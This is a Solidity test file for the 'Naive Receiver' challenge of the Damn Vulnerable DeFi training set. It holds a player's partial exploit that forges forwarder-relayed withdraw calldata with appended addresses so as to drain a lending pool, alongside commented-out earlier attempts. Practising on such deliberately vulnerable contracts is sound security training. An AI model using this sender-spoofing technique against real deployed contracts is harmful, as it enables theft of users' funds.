// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";
import {ECDSA} from "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
import {EIP712} from "solady/utils/EIP712.sol";
import {NaiveAttacker} from "./NaiveAttacker.sol";
import {IERC20}from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract NaiveReceiverChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        startHoax(deployer);

        // Deploy WETH
        weth = new WETH();

        // Deploy forwarder
        forwarder = new BasicForwarder();

        // Deploy pool and fund with ETH
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);

        // Deploy flashloan receiver contract and fund it with some initial WETH
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

        vm.stopPrank();
    }

    function test_assertInitialState() public {
        // Check initial balances
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);

        // Check pool config
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether);
        assertEq(pool.feeReceiver(), deployer);

        // Cannot call receiver
        vm.expectRevert(0x48f5c3ed);
        receiver.onFlashLoan(
            deployer,
            address(weth), // token
            WETH_IN_RECEIVER, // amount
            1 ether, // fee
            bytes("") // data
        );
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_naiveReceiver() public checkSolvedByPlayer {


        // new NaiveAttacker((address(pool)), receiver, recovery);

        uint256 initialPoolBalance = weth.balanceOf(address(pool));          
        console.log('initialPoolBalance: ', initialPoolBalance);
          

        // bytes memory data = abi.encodeCall(NaiveReceiverPool.withdraw, (initialPoolBalance, payable(recovery)));
        // console.log('data: ', string(data));
        
        // dataArray.push(data);
        // console.log('dataArray[0]: ', string(dataArray[0]));
 
        
        // pool.multicall(dataArray);


        // assertEq(weth.balanceOf(recovery), initialPoolBalance, "Incorrect final recovery balance");

        // uint256 playerInitialBalance = pool.deposits(player);

        
        // console.log('playerInitialBalance: ', playerInitialBalance);

        // pool.flashLoan(receiver, address(weth), 100 ether, '' );

        // uint256 playerFinalBalance = pool.deposits(player);

        // console.log('playerFinalBalance: ', playerFinalBalance);
        
        
        bytes memory data = abi.encodeWithSignature("withdraw(uint256,address)", WETH_IN_POOL, recovery, 
        address(pool),
        address(pool),
        address(pool),
        address(pool),
        address(pool),
        address(pool),
        address(pool),
         address(pool));
        console.log('data: ', string(data));
        

        BasicForwarder.Request memory request = BasicForwarder.Request({
            from: player,
            target: address(pool),
            value: 0,          // Set to 0 unless sending ETH
            gas: 1000000,
            nonce: 0,
            data: data,
            deadline: block.timestamp + 1 days
        });

    

        // Hash the request data
        bytes32 requestHash = forwarder.getDataHash(request);
        

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, forwarder.hashTypedData(requestHash));

        // Combine the signature parts into a single bytes object
        bytes memory signature = abi.encodePacked(r, s, v);

        forwarder.execute{value: 0}(request, signature);
        
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed two or less transactions
        assertLe(vm.getNonce(player), 2);

        // The flashloan receiver contract has been emptied
        assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");

        // Pool is empty too
        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");

        // All funds sent to recovery account
        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
    }
}
